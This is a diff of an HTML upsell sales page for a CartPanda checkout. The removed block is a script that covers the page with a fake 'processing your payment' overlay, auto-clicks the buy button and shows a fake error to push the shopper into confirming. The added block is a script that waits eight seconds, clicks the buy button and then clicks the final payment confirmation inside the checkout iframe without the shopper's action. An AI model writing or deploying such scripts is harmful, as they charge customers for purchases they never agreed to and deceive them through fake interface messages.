@@ -10,120 +10,6 @@
     new OcuExternal();
   </script>
 
-	<script>
-	document.addEventListener('DOMContentLoaded', () => {
-	  // --- 1) CSS do overlay, spinner e error message ---
-	  const style = document.createElement('style');
-	  style.innerHTML = `
-		#customOverlay {
-		  position: fixed; top:0; left:0;
-		  width:100%; height:100%;
-		  background: rgba(255,255,255,0.95);
-		  z-index: 999999;
-		  display: flex; flex-direction: column;
-		  justify-content: center; align-items: center;
-		  text-align: center; font-family: Arial, sans-serif;
-		  pointer-events: auto; /* bloqueia interações no início */
-		}
-		#customOverlay .spinner {
-		  border:8px solid #f3f3f3;
-		  border-top:8px solid #3498db;
-		  border-radius:50%;
-		  width:60px; height:60px;
-		  animation: spin 1s linear infinite;
-		  margin-bottom:20px;
-		}
-		@keyframes spin { from{transform:rotate(0)} to{transform:rotate(360deg)} }
-		#customOverlay .message {
-		  font-size:1.2em; margin:5px 0;
-		}
-		#customOverlay .error-msg {
-		  position: absolute;
-		  top:20px;
-		  left:50%;
-		  transform: translateX(-50%);
-		  background: #fff;
-		  padding: 12px 20px;
-		  border-radius: 4px;
-		  box-shadow: 0 2px 8px rgba(0,0,0,0.2);
-		  pointer-events: none; /* não captura clique */
-		  display: none;
-		  z-index: 1000000;
-		}
-	  `;
-	  document.head.appendChild(style);
-
-	  // --- 2) Cria overlay ---
-	  const overlay = document.createElement('div');
-	  overlay.id = 'customOverlay';
-	  overlay.innerHTML = `
-		<div class="spinner"></div>
-		<div class="message">NÃO FECHE NEM ATUALIZE A PÁGINA!</div>
-		<div class="message">PROCESSANDO SEU PAGAMENTO</div>
-		<div class="error-msg">
-		  HOUVE UM ERRO EM SEU PEDIDO,<br>
-		  CONFIRME NOVAMENTE CLICANDO NO BOTÃO ABAIXO
-		</div>
-	  `;
-	  document.body.appendChild(overlay);
-
-	  // --- 3) Após 1s, dispara BUY NOW ---
-	  setTimeout(() => {
-		const buy = document.querySelector('a.cta-button[href*="accepted=yes"]');
-		if (buy) buy.click();
-		else console.warn('Auto-upsell: BUY NOW não encontrado');
-	  }, 1000);
-
-	  // --- 4) Observa chegada do modal CartPanda ---
-	  const obs = new MutationObserver((mutations, observer) => {
-		for (const m of mutations) {
-		  for (const node of m.addedNodes) {
-			if (node.nodeType===1 &&
-			   (node.id==='cartpanda-modal-container' || node.classList.contains('cartpanda-modal'))) {
-
-			  // 4.1) Esconde spinner/mensagens iniciais e mostra o texto de erro
-			  overlay.querySelector('.spinner').style.display = 'none';
-			  overlay.querySelectorAll('.message').forEach(el => el.style.display = 'none');
-			  const errMsg = overlay.querySelector('.error-msg');
-			  errMsg.style.display = 'block';
-
-			  // 4.2) Agora permite todos os cliques atravessarem
-			  overlay.style.pointerEvents = 'none';
-
-			  // 4.3) Destaca os dois botões da CartPanda com outline
-			  [
-				'#cartpanda-close-modal-btn',          // botão “NÃO, OBRIGADO”
-				'#cartpanda-payment-confirmation'      // botão “SIM, CONFIRMAR”
-			  ].forEach(sel => {
-				const real = document.querySelector(sel);
-				if (!real) return;
-				const r = real.getBoundingClientRect();
-				const highlight = document.createElement('div');
-				Object.assign(highlight.style, {
-				  position: 'fixed',
-				  top:    `${r.top}px`,
-				  left:   `${r.left}px`,
-				  width:  `${r.width}px`,
-				  height: `${r.height}px`,
-				  border: '2px dashed #3498db',
-				  borderRadius: '4px',
-				  pointerEvents: 'none',
-				  zIndex: 1000001
-				});
-				document.body.appendChild(highlight);
-			  });
-
-			  observer.disconnect();
-			  return;
-			}
-		  }
-		}
-	  });
-
-	  obs.observe(document.body, { childList:true, subtree:true });
-	});
-	</script>
-
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -406,6 +292,82 @@
     <p>See you on the other side,<br>
     Dr. David Cain</p>
   </div>
+
+	<script>
+	  // Aguarda o conteúdo da página ser completamente carregado para iniciar o processo.
+	  document.addEventListener('DOMContentLoaded', () => {
+
+		// --- CONFIGURAÇÕES ---
+		const tempoDeEsperaEmSegundos = 8;
+		const seletorBotaoComprar = 'a.cta-button[href*="accepted=yes"]';
+		const seletorIframePopUp = 'iframe.cp-exocu-frame';
+		const idBotaoConfirmacaoFinal = 'cartpanda-payment-confirmation';
+		// -------------------
+
+		console.log('Script de compra automática iniciado. Aguardando ' + tempoDeEsperaEmSegundos + ' segundos...');
+
+		// 1. Aguarda o tempo definido para iniciar a compra.
+		setTimeout(() => {
+		  console.log('Tempo de espera finalizado. Procurando o botão "BUY NOW"...');
+		  const botaoComprar = document.querySelector(seletorBotaoComprar);
+
+		  if (botaoComprar) {
+			console.log('Botão "BUY NOW" encontrado. Clicando para iniciar o pop-up de confirmação...');
+			botaoComprar.click();
+
+			// 2. Inicia o monitoramento para encontrar e confirmar o pop-up.
+			monitorarPopupDeConfirmacao();
+		  } else {
+			console.error('ERRO: O botão "BUY NOW" com o seletor "' + seletorBotaoComprar + '" não foi encontrado na página.');
+		  }
+		}, tempoDeEsperaEmSegundos * 1000);
+
+		/**
+		 * Esta função fica verificando a cada 250ms se o iframe do pop-up e o botão de
+		 * confirmação final já apareceram na tela para poder clicar nele.
+		 */
+		function monitorarPopupDeConfirmacao() {
+		  let tentativas = 0;
+		  const maxTentativas = 60; // Tenta por 15 segundos (60 * 250ms)
+
+		  console.log('Iniciando monitoramento do pop-up de confirmação...');
+
+		  const intervalo = setInterval(() => {
+			tentativas++;
+			if (tentativas > maxTentativas) {
+			  clearInterval(intervalo);
+			  console.error('ERRO: O pop-up de confirmação não apareceu após ' + (maxTentativas * 250 / 1000) + ' segundos.');
+			  return;
+			}
+
+			const iframe = document.querySelector(seletorIframePopUp);
+
+			if (iframe) {
+			  console.log('Iframe do pop-up encontrado. Procurando pelo botão de confirmação final...');
+			  try {
+				// Acessa o documento dentro do iframe
+				const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
+				const botaoConfirmacao = iframeDocument.getElementById(idBotaoConfirmacaoFinal);
+
+				if (botaoConfirmacao) {
+				  console.log('Botão de confirmação final (' + idBotaoConfirmacaoFinal + ') encontrado. Realizando o clique!');
+				  
+				  // Clica no botão e para o monitoramento.
+				  botaoConfirmacao.click();
+				  clearInterval(intervalo);
+				  console.log('COMPRA DO UPSELL REALIZADA COM SUCESSO!');
+				} else {
+					 console.log('Ainda não encontrei o botão final, tentando novamente...');
+				}
+			  } catch (e) {
+				clearInterval(intervalo);
+				console.error('ERRO de segurança ao tentar acessar o conteúdo do iframe. Isso pode acontecer se o domínio do iframe for diferente. Detalhes:', e);
+			  }
+			}
+		  }, 250); // Verifica 4 vezes por segundo
+		}
+	  });
+	</script>
 
 </body>
 </html>
